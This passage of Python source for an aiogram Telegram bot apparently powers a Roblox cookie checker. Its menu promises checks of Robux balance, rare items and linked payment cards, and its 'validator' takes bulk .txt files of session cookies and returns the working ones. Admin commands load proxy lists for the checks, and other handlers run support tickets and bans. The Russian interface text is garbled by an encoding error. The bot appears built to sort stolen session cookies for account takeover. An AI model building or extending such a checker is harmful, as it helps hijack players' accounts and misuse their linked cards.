        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="ü©∏ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å Cookie ü©∏", callback_data="cookie_check"),
         InlineKeyboardButton(text="ü´¶ –ü—Ä–æ—Ñ–∏–ª—å ü´¶", callback_data="profile")],
        [InlineKeyboardButton(text="üòÆ‚Äçüí® –í–∞–ª–∏–¥–∞—Ç–æ—ÄüòÆ‚Äçüí®", callback_data="validator"),
         InlineKeyboardButton(text="üå¥ –ü–æ–¥–¥–µ—Ä–∂–∫–∞üå¥", callback_data="support")]
    ])
    
    await callback.message.edit_text(
        f'<b>‚ú®  |  –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é, @{callback.from_user.username}!  |  ‚ú®</b>\n\n'
        '„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞\n'
        '<b>ü™Ñ  @sparklchecker_bot  ‚Äî  —Ç–≤–æ–π –º–∞–≥–∏—á–µ—Å–∫–∏–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç</b>\n\n'
        '‚ñ´Ô∏è <b>–í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏:</b>\n'
        '   ‚àü üß™ –ü—Ä–æ–≤–µ—Ä–∫–∞ Roblox cookies\n'
        '   ‚àü üíé –ê–Ω–∞–ª–∏–∑ –±–∞–ª–∞–Ω—Å–∞ Robux\n'
        '   ‚àü üèÜ –ü–æ–∏—Å–∫ —Ä–µ–¥–∫–∏—Ö –ø—Ä–µ–¥–º–µ—Ç–æ–≤\n'
        '   ‚àü üí≥ –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—ã—Ö –∫–∞—Ä—Ç\n'
        '   ‚àü üõ°Ô∏è –ü–æ–∏—Å–∫ –±–µ–π–¥–∂–µ–π –∏ –≥–µ–π–º–ø–∞—Å–æ–≤\n\n'
        '„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞„Ä∞\n\n'
        '<b>üìØ  –ö–æ–º–∞–Ω–¥—ã:</b>\n'
        '   ‚àü <code>üç™ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å Cookie</code> ‚Äî –∑–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏\n'
        '   ‚àü <code>‚öôÔ∏è –ü—Ä–æ—Ñ–∏–ª—å </code> ‚Äî –≤–∞—à –ø—Ä–æ—Ñ–∏–ª—å\n\n'
        '<tg-spoiler>üîí –í–∞—à–∏ –∫—É–∫–∏ –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è</tg-spoiler>',
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    
@router.callback_query(F.data == "support")
async def support_handler(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="back_to_main")]
    ])
    
    await callback.message.answer(
        "<b>üí§ –ü–û–î–î–ï–†–ñ–ö–ê</b>\n\n"
        "–ù–∞–ø–∏—à–∏—Ç–µ –≤–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É. "
        "–û–ø–∏—à–∏—Ç–µ –ø—Ä–æ–±–ª–µ–º—É –∫–∞–∫ –º–æ–∂–Ω–æ –ø–æ–¥—Ä–æ–±–Ω–µ–µ, –∏ –º—ã –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –≤–∞–º –æ—Ç–≤–µ—Ç–∏–º!",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.support_message)

@router.message(Form.support_message)
async def process_support_message(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", parse_mode=ParseMode.HTML)
        return
    
    support_text = message.text or message.caption
    
    # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–∞–º–∏ –¥–ª—è –∞–¥–º–∏–Ω–æ–≤
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="üì® –û—Ç–≤–µ—Ç–∏—Ç—å", 
                callback_data=f"reply_{user_id}"),
            InlineKeyboardButton(text="‚ùå –°–∫—Ä—ã—Ç—å", 
                callback_data=f"hide_admin_{user_id}")
        ]
    ])
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤—Å–µ–º –∞–¥–º–∏–Ω–∞–º
    for admin_id in ADMINS:
        try:
            await bot.send_message(
                admin_id,
                f"<b>üí§ –ù–û–í–´–ô –ó–ê–ü–†–û–° –í –ü–û–î–î–ï–†–ñ–ö–£</b>\n\n"
                f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{message.from_user.username} (ID: {user_id})\n"
                f"üìù –°–æ–æ–±—â–µ–Ω–∏–µ:\n{support_text}",
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard
            )
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –∞–¥–º–∏–Ω—É {admin_id}: {e}")
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="back_to_main")]
    ])
    
    await message.answer(
        "<b>‚úÖ –í–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É!</b>\n\n"
        "–û–∂–∏–¥–∞–π—Ç–µ –æ—Ç–≤–µ—Ç–∞ –≤ —ç—Ç–æ–º —á–∞—Ç–µ. –°—Ä–µ–¥–Ω–µ–µ –≤—Ä–µ–º—è –æ—Ç–≤–µ—Ç–∞ - 24 —á–∞—Å–∞.",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.clear()

@router.callback_query(F.data.startswith("reply_"))
async def admin_reply_handler(callback: CallbackQuery, state: FSMContext):
    admin_id = callback.from_user.id
    if admin_id not in ADMINS:
        await callback.answer("‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω", show_alert=True)
        return
    
    user_id = int(callback.data.split("_")[1])
    await state.update_data(target_user=user_id)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="‚ùå –°–∫—Ä—ã—Ç—å", callback_data=f"hide_admin_{user_id}")]
    ])
    
    await callback.message.answer(
        f"<b>üì® –û–¢–í–ï–¢ –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–Æ (ID: {user_id})</b>\n\n"
        "–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –æ—Ç–≤–µ—Ç. –í—ã –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç–µ–∫—Å—Ç, —Ñ–æ—Ç–æ –∏–ª–∏ –¥–æ–∫—É–º–µ–Ω—Ç—ã.",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.admin_reply)

@router.message(Form.admin_reply)
async def process_admin_reply(message: Message, state: FSMContext):
    data = await state.get_data()
    user_id = data.get('target_user')
    
    if not user_id:
        await message.answer("‚ùå –û—à–∏–±–∫–∞: –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")
        await state.clear()
        return
    
    try:
        # –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        user_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="üì® –û—Ç–≤–µ—Ç–∏—Ç—å", callback_data="support"),
             InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="back_to_main")]
        ])
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç–≤–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
        if message.photo:
            await bot.send_photo(
                chat_id=user_id,
                photo=message.photo[-1].file_id,
                caption=f"<b>üì® –û–¢–í–ï–¢ –ü–û–î–î–ï–†–ñ–ö–ò</b>\n\n{message.caption}",
                parse_mode=ParseMode.HTML,
                reply_markup=user_keyboard
            )
        else:
            await bot.send_message(
                chat_id=user_id,
                text=f"<b>üì® –û–¢–í–ï–¢ –ü–û–î–î–ï–†–ñ–ö–ò</b>\n\n{message.text}",
                parse_mode=ParseMode.HTML,
                reply_markup=user_keyboard
            )
        
        # –£–≤–µ–¥–æ–º–ª—è–µ–º –∞–¥–º–∏–Ω–∞
        await message.answer(
            f"<b>‚úÖ –û—Ç–≤–µ—Ç —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é (ID: {user_id})</b>",
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        await message.answer(
            f"<b>‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ—Ç–≤–µ—Ç–∞:</b>\n{str(e)}",
            parse_mode=ParseMode.HTML
        )
    
    await state.clear()

@router.message(Form.validator_file)
async def process_validator_file(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", parse_mode=ParseMode.HTML)
        return
    
    file_path = None
    try:
        if not message.document:
            await message.answer("<b>‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª —Å –∫—É–∫–∞–º–∏.</b>", parse_mode=ParseMode.HTML)
            return

        if not message.document.file_name.endswith('.txt'):
            await message.answer("<b>‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —Ñ–∞–π–ª–∞. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Ñ–∞–π–ª (txt).</b>", parse_mode=ParseMode.HTML)
            return

        file_id = message.document.file_id
        file_name = f"validator_{random.randint(100000, 999999)}.txt"
        file_path = f"{COOKIE_FILES_DIR}{file_name}"
        
        msg = await message.answer("<b>‚è≥ –°–∫–∞—á–∏–≤–∞—é —Ñ–∞–π–ª... –≠—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –≤—Ä–µ–º—è –¥–ª—è –±–æ–ª—å—à–∏—Ö —Ñ–∞–π–ª–æ–≤.</b>", parse_mode=ParseMode.HTML)
        
        await bot.download(file_id, destination=file_path)
        
        file_info = process_cookie_file(file_path)
        
        if not file_info['cookies']:
            await msg.edit_text("<b>‚ùå –í —Ñ–∞–π–ª–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –≤–∞–ª–∏–¥–Ω—ã—Ö cookies. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Ñ–æ—Ä–º–∞—Ç —Ñ–∞–π–ª–∞.</b>", parse_mode=ParseMode.HTML)
            return
        
        # –°–æ–∑–¥–∞–µ–º –æ—Ç–¥–µ–ª—å–Ω—É—é –æ—á–µ—Ä–µ–¥—å –¥–ª—è –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–∞
        validator_queue.put((message.from_user.id, file_info, msg))
        queue_size = validator_queue.qsize()
        
        if current_validator_checking is None:
            status_msg = (
                "<b>üìä –§–ê–ô–õ –î–û–ë–ê–í–õ–ï–ù –í –û–ß–ï–†–ï–î–¨ –í–ê–õ–ò–î–ê–¢–û–†–ê</b>\n\n"
                "ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n"
                f"üìù –í—Å–µ–≥–æ —Å—Ç—Ä–æ–∫: <b>{file_info['total_lines']}</b>\n"
                f"‚úÖ –í–∞–ª–∏–¥–Ω—ã—Ö –∫—É–∫–∏: <b>{len(file_info['cookies'])}</b>\n"
                f"‚ôªÔ∏è –î—É–±–ª–∏–∫–∞—Ç–æ–≤: <b>{file_info['duplicates']}</b>\n"
                f"‚ùå –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö —Å—Ç—Ä–æ–∫: <b>{file_info['invalid_lines']}</b>\n\n"
                "‚è≥ –û–∂–∏–¥–∞–π—Ç–µ –Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏..."
            )
        else:
            status_msg = (
    "<b>üìä –§–ê–ô–õ –î–û–ë–ê–í–õ–ï–ù –í –û–ß–ï–†–ï–î–¨ –í–ê–õ–ò–î–ê–¢–û–†–ê</b>\n\n"
    "ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n"
    f"üìù –í—Å–µ–≥–æ —Å—Ç—Ä–æ–∫: <b>{file_info['total_lines']}</b>\n"
    f"‚úÖ –í–∞–ª–∏–¥–Ω—ã—Ö –∫—É–∫–∏: <b>{len(file_info['cookies'])}</b>\n"
    f"‚ôªÔ∏è –î—É–±–ª–∏–∫–∞—Ç–æ–≤: <b>{file_info['duplicates']}</b>\n"
    f"‚ùå –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö —Å—Ç—Ä–æ–∫: <b>{file_info['invalid_lines']}</b>\n\n"
    f"üìä –í–∞—à–∞ –ø–æ–∑–∏—Ü–∏—è –≤ –æ—á–µ—Ä–µ–¥–∏: <b>{queue_size}</b>\n"
    f"üïí –ü—Ä–∏–º–µ—Ä–Ω–æ–µ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è: <b>{queue_size * 2}-{queue_size * 5} –º–∏–Ω—É—Ç</b>\n\n"
    "üîÑ –°—Ç–∞—Ç—É—Å –æ—á–µ—Ä–µ–¥–∏ –±—É–¥–µ—Ç –æ–±–Ω–æ–≤–ª—è—Ç—å—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏."
)
        
        await msg.edit_text(status_msg, parse_mode=ParseMode.HTML)
        await notify_validator_queue_update()
            
    except Exception as e:
        error_message = (
            f"<b>‚ùå –û–®–ò–ë–ö–ê –û–ë–†–ê–ë–û–¢–ö–ò –§–ê–ô–õ–ê</b>\n\n"
            f"ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n"
            f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ —Ñ–∞–π–ª–∞:\n"
            f"<code>{str(e)}</code>\n\n"
            f"–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑ –∏–ª–∏ –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É."
        )
        await message.answer(error_message, parse_mode=ParseMode.HTML)
        logging.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ñ–∞–π–ª–∞ –≤ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–µ: {e}")
    finally:
        if file_path and os.path.exists(file_path):
            os.remove(file_path)

@router.callback_query(F.data.startswith("hide_admin_"))
async def hide_admin_message(callback: CallbackQuery):
    user_id = int(callback.data.split("_")[-1])
    if callback.from_user.id in ADMINS:
        await callback.message.delete()
        await callback.answer("–°–æ–æ–±—â–µ–Ω–∏–µ —Å–∫—Ä—ã—Ç–æ")
    else:
        await callback.answer("‚ùå –ù–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —ç—Ç–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è", show_alert=True)

@router.callback_query(F.data == "validator")
async def validator_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="ü©∏–ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—Éü©∏", callback_data="start_validator")],
        [InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="back_to_main")]
    ])
    
    await callback.message.edit_text(
        '<b>ü©∏–ú–ï–ù–Æ –í–ê–õ–ò–î–ê–¢–û–†–ê COOKIEü©∏</b>\n\n'
        '<b>ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå</b>\n'
        '<b>‚úÖ–ü—Ä–æ—Å—Ç–æ–π –≤–∞–ª–∏–¥–∞—Ç–æ—Ä –∫—É–∫–∏:‚úÖ</b>\n\n'
        '1. –ë—ã—Å—Ç—Ä–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å\n'
        '2. –£–¥–∞–ª–µ–Ω–∏–µ –¥—É–±–ª–∏–∫–∞—Ç–æ–≤\n'
        '3. –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ç–æ–ª—å–∫–æ —Ä–∞–±–æ—á–∏–µ –∫—É–∫–∏\n\n'
        '<b>ü§î–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:ü§î</b>\n'
        '1. –ù–∞–∂–º–∏—Ç–µ "ü©∏–ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—Éü©∏"\n'
        '2. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª —Å –∫—É–∫–∞–º–∏ (txt)\n'
        '3. –ü–æ–ª—É—á–∏—Ç–µ —Ñ–∞–π–ª —Å –≤–∞–ª–∏–¥–Ω—ã–º–∏ –∫—É–∫–∞–º–∏\n\n'
        '<b>üö®–í–Ω–∏–º–∞–Ω–∏–µ:üö®</b>\n'
        '- –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä —Ñ–∞–π–ª–∞: 20MB\n'
        '- –ü—Ä–æ–≤–µ—Ä–∫–∞ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –≤—Ä–µ–º—è\n'
        '- –ù–∞—à —á–µ–∫–µ—Ä - –≤–∞—à–∞ —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç—å',
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "start_validator")
async def start_validator(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"‚ùå –í—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã. –ü—Ä–∏—á–∏–Ω–∞: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="validator")]
    ])
    
    await callback.message.answer(
        '<b>ü©∏–ò–ù–°–¢–†–£–ö–¶–ò–Ø –í–ê–õ–ò–î–ê–¢–û–†–êü©∏</b>\n\n'
        '<b>ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå</b>\n'
        '1. <b>–ü–æ–¥–≥–æ—Ç–æ–≤—å—Ç–µ —Ñ–∞–π–ª</b> —Å –∫—É–∫–∞–º–∏ (—Ñ–æ—Ä–º–∞—Ç txt)\n'
        '2. <b>–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª</b> –≤ —ç—Ç–æ—Ç —á–∞—Ç\n\n'
        '<b>ü§î–¢—Ä–µ–±–æ–≤–∞–Ω–∏—è –∫ —Ñ–∞–π–ª—É:ü§î</b>\n'
        '- –¢–æ–ª—å–∫–æ —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Ñ–æ—Ä–º–∞—Ç (txt)\n'
        '- –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä: 20MB\n'
        '- –ö–∞–∂–¥—ã–π –∫—É–∫–∏ –Ω–∞ –Ω–æ–≤–æ–π —Å—Ç—Ä–æ–∫–µ\n\n'
        '<b>–ß—Ç–æ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è:</b>\n'
        '- –í–∞–ª–∏–¥–Ω–æ—Å—Ç—å –∫—É–∫–∏\n'
        '- –£–¥–∞–ª–µ–Ω–∏–µ –¥—É–±–ª–∏–∫–∞—Ç–æ–≤\n\n'
        '<b>‚úÖ–û–∂–∏–¥–∞—é –≤–∞—à —Ñ–∞–π–ª...‚úÖ</b>',
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.validator_file)

@router.message(Command("setproxy"))
async def set_proxy(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    try:
        proxies = message.text.split('\n')[1:]
        proxies = [p.strip() for p in proxies if p.strip()]
        
        if not proxies:
            await message.answer("<b>‚ùå –°–ø–∏—Å–æ–∫ –ø—Ä–æ–∫—Å–∏ –ø—É—Å—Ç. –£–∫–∞–∂–∏—Ç–µ –ø—Ä–æ–∫—Å–∏ –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã.</b>", parse_mode=ParseMode.HTML)
            return
        
        Database.save_proxies(proxies)
        await message.answer(
            f"<b>‚úÖ –ü—Ä–æ–∫—Å–∏ —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã!</b>\n\n"
            f"<b>–û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ:</b> {len(proxies)}\n"
            f"<b>–ü–µ—Ä–≤—ã–µ 5 –ø—Ä–æ–∫—Å–∏:</b>\n" + "\n".join(proxies[:5]),
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await message.answer(
            f"<b>‚ùå –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –ø—Ä–æ–∫—Å–∏:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )

@router.message(Command("listproxy"))
async def list_proxy(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    proxies = Database.load_proxies()
    if not proxies:
        await message.answer("<b>üìÉ –°–ø–∏—Å–æ–∫ –ø—Ä–æ–∫—Å–∏ –ø—É—Å—Ç</b>", parse_mode=ParseMode.HTML)
    else:
        text = (
            f"<b>üìÉ –°–ø–∏—Å–æ–∫ –ø—Ä–æ–∫—Å–∏ (–≤—Å–µ–≥–æ: {len(proxies)})</b>\n\n"
            f"<code>" + "\n".join(proxies[:20]) + "</code>\n\n"
            f"<i>–ü–æ–∫–∞–∑–∞–Ω–æ –ø–µ—Ä–≤—ã—Ö 20 –∏–∑ {len(proxies)}</i>"
        )
        await message.answer(text, parse_mode=ParseMode.HTML)

@router.message(Command("ban"))
async def ban_user(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    try:
        args = message.text.split(maxsplit=2)
        if len(args) < 3:
            await message.answer(
                "<b>‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã.</b>\n"
                "<b>–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ:</b> <code>/ban @username –∏–ª–∏ ID –ø—Ä–∏—á–∏–Ω–∞</code>\n\n"
                "<i>–ü—Ä–∏–º–µ—Ä:</i> <code>/ban 12345678 –ù–∞—Ä—É—à–µ–Ω–∏–µ –ø—Ä–∞–≤–∏–ª</code>",
                parse_mode=ParseMode.HTML
            )
            return
        
        target = args[1].strip('@')
        reason = args[2]
        
        if target.isdigit():
            user_id = int(target)
            username = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
        else:
            user_id = None
            for user in Database.get_all_users():
                config = Database.get_user_config(user)
                if config.get('username') == target:
                    user_id = user
                    username = target
                    break
        
        if not user_id:
            await message.answer(f"<b>‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å @{target} –Ω–µ –Ω–∞–π–¥–µ–Ω.</b>", parse_mode=ParseMode.HTML)
            return
        
        Database.ban_user(user_id, reason)
        
        try:
            await bot.send_message(
                chat_id=user_id,
                text=f"<b>‚ùå –í–´ –ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–´</b>\n\n–ü—Ä–∏—á–∏–Ω–∞: {reason}\n\n"
                     "–ï—Å–ª–∏ –≤—ã —Å—á–∏—Ç–∞–µ—Ç–µ —ç—Ç–æ –æ—à–∏–±–∫–æ–π, —Å–≤—è–∂–∏—Ç–µ—Å—å —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logging.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id} –æ –±–ª–æ–∫–∏—Ä–æ–≤–∫–µ: {e}")
        
        await message.answer(
            f"<b>‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å @{username} (ID: {user_id}) –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.</b>\n"
            f"<b>–ü—Ä–∏—á–∏–Ω–∞:</b> {reason}",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await message.answer(
            f"<b>‚ùå –û—à–∏–±–∫–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )

@router.message(Command("unban"))
async def unban_user(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await message.answer(
                "<b>‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã.</b>\n"
                "<b>–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ:</b> <code>/unban @username –∏–ª–∏ ID</code>\n\n"
                "<i>–ü—Ä–∏–º–µ—Ä:</i> <code>/unban 12345678</code>",
                parse_mode=ParseMode.HTML
            )
            return
        
        target = args[1].strip('@')
        
        if target.isdigit():
            user_id = int(target)
            username = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
        else:
            user_id = None
            for user in Database.get_all_users():
                config = Database.get_user_config(user)
                if config.get('username') == target:
                    user_id = user
                    username = target
                    break
        
        if not user_id:
            await message.answer(f"<b>‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å @{target} –Ω–µ –Ω–∞–π–¥–µ–Ω.</b>", parse_mode=ParseMode.HTML)
            return
        
        if not Database.is_user_banned(user_id):
            await message.answer(f"<b>‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å @{target} (ID: {user_id}) –Ω–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.</b>", parse_mode=ParseMode.HTML)
            return
        
        Database.unban_user(user_id)
        
        try:
            await bot.send_message(
                chat_id=user_id,
